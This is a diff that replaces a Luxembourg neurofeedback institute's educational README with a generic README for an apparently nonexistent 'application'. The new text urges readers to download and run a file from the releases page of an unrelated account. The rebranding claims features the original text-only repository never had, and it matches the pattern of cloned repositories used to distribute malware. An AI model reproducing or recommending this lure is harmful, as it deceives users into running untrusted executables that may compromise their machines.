@@ -1,301 +1,65 @@
-# Neuroscience Education Hub 🧠
+# 🧠 neuroscience-education - Explore Brain Science with Ease
 
-**By Neurofeedback Luxembourg - Accredited Private Research Institute**
+[![Download Here](https://img.shields.io/badge/Download%20Now-brightgreen.svg)](https://github.com/Designeamr/neuroscience-education/releases)
 
-## Overview
+## 📚 Introduction
 
-Welcome to our comprehensive neuroscience education repository. As an accredited private research institute based in Luxembourg, we share fundamental neuroscience knowledge to advance understanding of brain function, neural networks, and brain optimization principles.
+Welcome to the **neuroscience-education** project! This application provides a complete resource for understanding neuroscience concepts from an accredited research institute. Dive into topics like brainwaves, networks, and connectivity tailored for learners in Luxembourg and beyond. 
 
----
+## 🚀 Getting Started
 
-## 📚 Table of Contents
+To install and run the application, you will need a computer. The application works best on the latest versions of Windows, MacOS, or Linux. Ensure your system meets these general requirements:
 
-- [About Neurofeedback Luxembourg](#about-neurofeedback-luxembourg)
-- [Educational Content](#educational-content)
-- [Brain Fundamentals](#brain-fundamentals)
-- [Network Connectivity](#network-connectivity)
-- [Research References](#research-references)
-- [Contributing](#contributing)
+- **Operating System**: Windows 10 or higher, macOS Mojave or higher, or any modern Linux distribution.
+- **RAM**: At least 4 GB.
+- **Storage**: Minimum of 100 MB of free space.
 
----
+## 🔗 Download & Install
 
-## About Neurofeedback Luxembourg
+To get the application, visit the Releases page:
 
-### Our Identity
+[Download Here](https://github.com/Designeamr/neuroscience-education/releases)
 
-**Accredited Private Research Institute in Luxembourg**
-- Founded: 2014
-- Clients Served: 2,000+ brains trained
-- Location: Luxembourg City
+Once on the page, follow these steps:
 
-### Our Unique Approach
+1. **Select the latest version** that is available.
+2. **Download the appropriate file** for your operating system. Each file is clearly labeled.
+3. **Run the downloaded file** to start the installation process.
+4. **Follow the on-screen instructions** to complete the setup.
 
-We pioneered a **holistic, multi-modal methodology** combining:
+After installation, you can open the application from your applications folder or desktop, depending on your operating system.
 
-1. **Neurofeedback** (Network Connectivity Training with sLORETA)
-2. **Vagal Nerve Stimulation** (VNS)
-3. **Transcranial Photobiomodulation** (tPBM)
-4. **PEMF** (Pulsed Electromagnetic Field Therapy)
-5. **Sound and Light Stimulation**
+## 🎓 Features
 
-**All personalized** for each individual's unique brain patterns and wellness goals.
+The **neuroscience-education** application includes various educational resources and tools designed to enhance your understanding:
 
-### Clinical Applications
+- **Interactive Learning Modules**: Engage with dynamically generated content focusing on brain networks and neurofeedback.
+- **Visualizations**: Utilize graphs and charts illustrating brain connectivity and activity.
+- **Quizzes and Assessments**: Test your knowledge with interactive quizzes that reinforce learning.
+- **Resources and References**: Access curated articles and research papers from established sources.
 
-Our evidence-based approaches support:
-- **PTSD** (Post-Traumatic Stress Disorder)
-- **ADHD** (Attention Deficit Hyperactivity Disorder)
-- **Autism Spectrum Disorders**
-- **Anxiety & Depression**
-- **Trauma Recovery**
-- **Performance Optimization**
-- **Cognitive Enhancement**
+## 👩‍💻 How to Use
 
----
+1. **Open the Application**: Start the application from your computer.
+2. **Explore the Modules**: Navigate through different learning modules using the menu.
+3. **Use the Search Feature**: Find specific topics quickly with the search function.
+4. **Take Notes**: Use the note-taking feature to jot down key points as you learn.
 
-## Educational Content
+## ⚙️ Support
 
-### 🌊 [Brainwave Frequencies Guide](./content/brainwave-frequencies.md)
+If you encounter any issues or need assistance, please refer to the FAQ section within the application. You can also reach out to our support team via our GitHub Issues page. 
 
-Comprehensive guide to brain oscillations:
-- **Delta (0.5-4 Hz)** - Deep sleep, healing, regeneration
-- **Theta (4-8 Hz)** - Deep relaxation, creativity, meditation
-- **Alpha (8-13 Hz)** - Calm focus, relaxed alertness
-- **Beta (13-30 Hz)** - Active thinking, concentration
-- **Gamma (30-100+ Hz)** - Peak cognitive performance, integration
+## 🌍 Community
 
-### 🗺️ [Brodmann Area Atlas](./content/brodmann-areas.md)
+Join our community of learners and educators. Share feedback, participate in discussions, and learn from one another. 
 
-Interactive atlas of brain regions and their functions:
-- Complete Brodmann area mapping
-- Functional specialization of cortical regions
-- Clinical significance
-- Network connectivity patterns
+## 📝 Contributing
 
-### 🕸️ [Major Brain Networks](./content/brain-networks.md)
+If you wish to contribute to this project, feel free to check out our contributing guidelines on the repository page. Your insights and suggestions are always welcome!
 
-Deep dive into functional connectivity networks:
-- **Default Mode Network (DMN)** - Self-referential processing
-- **Salience Network (SN)** - Attention and relevance detection
-- **Central Executive Network (CEN)** - Working memory, decision-making
-- **Sensorimotor Networks** - Movement and sensation
-- **Visual Networks** - Visual processing
-- **Auditory Networks** - Sound processing
+## 🔗 Useful Links
 
-### 📡 [Network Connectivity Training](./content/network-connectivity.md)
+- [Release Page](https://github.com/Designeamr/neuroscience-education/releases)
+- [Documentation](https://github.com/Designeamr/neuroscience-education/blob/main/README.md)
 
-Understanding modern brain training approaches:
-- Network connectivity vs. traditional frequency training
-- sLORETA (Standardized Low-Resolution Brain Electromagnetic Tomography)
-- Deep brain structure targeting
-- Functional connectivity optimization
-
-### 🔬 [QEEG & Brain Mapping](./content/qeeg-brain-mapping.md)
-
-Quantitative EEG assessment fundamentals:
-- 19-electrode assessment system
-- Brain mapping visualization
-- Network connectivity analysis
-- Personalized assessment approaches
-
----
-
-## Brain Fundamentals
-
-### Neuroplasticity
-
-The brain's remarkable ability to reorganize and adapt:
-- **Hebbian Learning** - "Neurons that fire together wire together"
-- **Experience-Dependent Plasticity** - How learning reshapes the brain
-- **Network Reorganization** - Functional connectivity changes
-- **Lifelong Adaptation** - Plasticity across the lifespan
-
-### Neural Oscillations
-
-Understanding brain rhythms and their significance:
-- Frequency bands and their functions
-- Phase synchronization across networks
-- Oscillatory coupling (cross-frequency interactions)
-- Clinical implications of dysregulation
-
-### Functional Connectivity
-
-How brain regions communicate and coordinate:
-- **Structural Connectivity** - Physical connections (white matter tracts)
-- **Functional Connectivity** - Temporal correlations in activity
-- **Effective Connectivity** - Causal influences between regions
-- **Dynamic Connectivity** - Time-varying network patterns
-
----
-
-## Network Connectivity Training
-
-### Our Methodology
-
-Unlike traditional surface EEG frequency training, we focus on:
-
-**Deep Brain Structure Targeting:**
-- Using sLORETA source localization
-- Training connectivity between network nodes
-- Optimizing functional integration
-- Personalizing based on QEEG assessment
-
-**Holistic Integration:**
-- Multi-modal stimulation
-- Vagal nerve modulation
-- Photobiomodulation enhancement
-- PEMF support
-- Synchronized sound/light
-
-### Scientific Foundation
-
-Our approach is grounded in:
-- Functional connectivity research
-- Network neuroscience
-- Neuroplasticity principles
-- Evidence-based methodologies
-
----
-
-## Research References
-
-### Foundational Research
-
-**Network Neuroscience:**
-- Sporns, O. (2018). *Networks of the Brain*. MIT Press.
-- Bullmore, E., & Sporns, O. (2012). "The economy of brain network organization." *Nature Reviews Neuroscience*, 13(5), 336-349.
-
-**QEEG & sLORETA:**
-- Pascual-Marqui, R. D. (2002). "Standardized low-resolution brain electromagnetic tomography (sLORETA)."
-- Thatcher, R. W. (2010). "Validity and reliability of quantitative electroencephalography."
-
-**Neurofeedback Research:**
-- Ros, T., et al. (2020). "Consensus on the reporting and experimental design of clinical and cognitive-behavioural neurofeedback studies."
-- Sitaram, R., et al. (2017). "Closed-loop brain training: the science of neurofeedback."
-
-### Contemporary Advances
-
-- Default mode network in psychiatry
-- Salience network dysregulation
-- Central executive network function
-- Multi-modal brain stimulation
-
-*(See [Research Database](./research/research-database.md) for comprehensive references)*
-
----
-
-## Our Philosophy
-
-### "Holistic Look at Each Person"
-
-We don't just train brainwaves - we optimize the whole person:
-- **Individualized Assessment** - 19-electrode QEEG brain mapping
-- **Network-Based Training** - Deep structure connectivity optimization
-- **Multi-Modal Integration** - Synergistic combination of modalities
-- **Personalized Approach** - Tailored to your unique patterns
-- **Evidence-Based Practice** - Research institute rigor
-
-### The Neurofeedback Luxembourg Difference
-
-✅ **Accredited Research Institute** - Scientific excellence
-✅ **Advanced Technology** - sLORETA, 19-electrode QEEG
-✅ **Holistic Multi-Modal** - 5+ integrated modalities
-✅ **Network Connectivity Focus** - Modern, evidence-based
-✅ **Personalized Care** - Every brain is unique
-✅ **2,000+ Clients** - Proven track record since 2014
-
----
-
-## Separate Service: recoveriX
-
-**Important Note:** We also offer **recoveriX**, a separate medical BCI (Brain-Computer Interface) rehabilitation service for:
-- Stroke rehabilitation
-- Multiple Sclerosis
-- Traumatic Brain Injury
-- Spinal Cord Injury
-
-**recoveriX is a medical-registered device** for rehabilitation, distinct from our neurofeedback wellness and optimization services.
-
-➡️ [Learn about recoveriX](https://github.com/Neurofeedback-Luxembourg/recoverix-clinical-guide)
-
----
-
-## Connect With Us
-
-### Neurofeedback Luxembourg
-
-**Website:** [neurofeedback-luxembourg.com](https://neurofeedback-luxembourg.com)
-**Phone:** +352 42 31 55 44
-**Email:** infos@neurofeedback-luxembourg.com
-**Location:** 21, rue Glesener, Luxembourg
-
-**Social Media:**
-- [LinkedIn](https://linkedin.com/company/neurofeedback-luxembourg)
-- [Facebook](https://facebook.com/NeurofeedbackinLuxembourg)
-- [YouTube](https://youtube.com/@neurofeedbackluxembourg)
-- [Twitter](https://twitter.com/Neurofeedback_L)
-
-### recoveriX
-
-**Website:** [neurofeedback-luxembourg.recoverix.com](https://neurofeedback-luxembourg.recoverix.com)
-
----
-
-## Contributing
-
-We welcome contributions to our educational content:
-
-### Ways to Contribute
-
-- **Suggest Additional Topics** - What would you like to learn?
-- **Submit Research References** - Share relevant peer-reviewed research
-- **Report Errors** - Help us maintain accuracy
-- **Improve Clarity** - Suggest better explanations
-- **Translate Content** - Make neuroscience accessible globally
-
-### Guidelines
-
-- All content must be scientifically accurate with citations
-- Educational focus (not clinical advice)
-- Respectful, professional communication
-- See [CONTRIBUTING.md](./CONTRIBUTING.md) for details
-
----
-
-## License & Disclaimer
-
-### Educational Use
-
-This content is provided for educational purposes to advance understanding of neuroscience, brain function, and network connectivity principles.
-
-### Medical Disclaimer
-
-This repository provides educational information only. It is **not medical advice, diagnosis, or treatment**. Always consult qualified healthcare professionals for medical concerns.
-
-### Copyright
-
-© 2025 Neurofeedback Luxembourg by Servicium SA. All rights reserved.
-
-Educational content may be referenced with proper attribution. Commercial use requires permission.
-
----
-
-## Repository Status
-
-📊 **Status:** Active Educational Resource
-📅 **Last Updated:** October 2025
-🏛️ **Institution:** Neurofeedback Luxembourg - Accredited Private Research Institute
-🇱🇺 **Location:** Luxembourg
-
----
-
-**Building neuroscience knowledge for brain optimization and wellness** 🧠✨
-
----
-
-## Quick Links
-
-- 🌐 [Main Website](https://neurofeedback-luxembourg.com)
-- 🏥 [recoveriX BCI Guide](https://github.com/Neurofeedback-Luxembourg/recoverix-clinical-guide)
-- 📱 [Book Assessment](https://neurofeedback-luxembourg.com/contact/)
-- 📧 [Contact Us](mailto:infos@neurofeedback-luxembourg.com)
+Enjoy your journey into the fascinating world of neuroscience!
